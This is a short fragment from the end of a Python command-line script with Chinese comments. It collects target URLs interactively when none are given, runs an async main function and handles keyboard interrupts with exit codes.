        # [v4.2] 无目标参数 → 交互模式收集
        targets = prompt_targets()
        if not targets:
            print("[-] 未提供任何有效目标，退出")
            sys.exit(2)
        args.url = targets
    try:
        sys.exit(asyncio.run(async_main(args)))
    except KeyboardInterrupt:
        print("\n[!] 中断退出")
        sys.exit(130)


if __name__ == "__main__":
    main()